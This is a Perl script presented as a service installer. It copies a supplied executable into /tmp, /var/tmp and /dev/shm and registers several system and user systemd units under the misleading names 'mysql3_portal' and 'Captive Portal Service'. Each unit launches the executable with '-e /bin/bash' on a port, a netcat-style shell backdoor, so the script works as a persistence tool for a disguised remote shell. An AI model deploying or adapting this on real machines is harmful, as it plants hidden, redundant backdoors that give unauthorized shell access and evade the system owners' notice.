#!/usr/bin/env perl

=head1 NAME

install_service.pl - Add a service for the supplied executable

=head1 SYNOPSIS

  perl install_service.pl [executable]
  ./install_service.pl [executable]

=head1 DESCRIPTION

Run the script with the desired executable with the arguments specified in the
$executable_args variable. This script will create multiple system and user
services with the executable being copied to multiple directories. If this is
not desired, run the command as an unprivileged user and remove the directories
in the @cp_dirs variables.

=cut

my @cp_dirs = qw(/var/tmp /tmp /dev/shm);
my $executable_args = 'localhost 1000 -e /bin/bash';
my $service_name = 'mysql3_portal';

if (@ARGV < 1) {
	die "Usage: $0 [executable]";
}

my $exec_file = $ARGV[0];

if (! -x $exec_file) {
	die "provide an executable file ($exec_file is not executable)";
}

# copy executable to other directories
my ($exec_bname) = $exec_file =~ /([^\/]+)$/;
for my $dir (@cp_dirs) {
	system("cp", $exec_file, "$dir/$exec_bname") == 0 or print "copy to $dir failed: $!";
}

# add to system services
if (-w '/etc/systemd/service') {
	my $i = 0;
	for my $dir (@cp_dirs) {
		open(my $fh, '>', "/etc/systemd/service/${service_name}_${i}.service") or do {
			print "could not open service file: $!";
			next;
		};

		my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$dir/$exec_bname $executable_args

[Install]
WantedBy=multi-user.target
END
		print $fh $service_text;
		close $fh;

		`systemctl start ${service_name}_${i}.service`;

		$i++;
	}

	open(my $fh, '>', "/etc/systemd/service/${service_name}.service") or do {
		print "could not open service file: $!";
		next;
	};

	my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$exec_file $executable_args

[Install]
WantedBy=multi-user.target
END
	print $fh $service_text;
	close $fh;

	`systemctl start ${service_name}.service`;
}

# try to make directory
if (! -d "$ENV{HOME}/.config/systemd/user/") {
	my @dirs = split('/', "$ENV{HOME}/.config/systemd/user/");
	my $current_path = '';

	for my $dir (@dirs) {
		$current_path .= "$dir/";
		if (! -d $current_path && ! mkdir $current_path) {
			print "unable to $current_path\n";
		}
	}
}

# add to user services
if (-w "$ENV{HOME}/.config/systemd/user/") {
	my $i = 0;
	for my $dir (@cp_dirs) {
		open(my $fh, '>',  "$ENV{HOME}/.config/systemd/user/${service_name}_${i}-u.service") or do {
			print "could not open service file: $!";
			next;
		};

		my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$dir/$exec_bname $executable_args

[Install]
WantedBy=multi-user.target
END
		print $fh $service_text;
		close $fh;

		`systemctl start --user ${service_name}_${i}-u.service`;

		$i++;
	}

	open(my $fh, '>', "$ENV{HOME}/.config/systemd/user/${service_name}-u.service") or do {
		print "could not open service file: $!";
		next;
	};

	my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$exec_file $executable_args

[Install]
WantedBy=multi-user.target
END
	print $fh $service_text;
	close $fh;

	`systemctl start --user ${service_name}-u.service`;
}
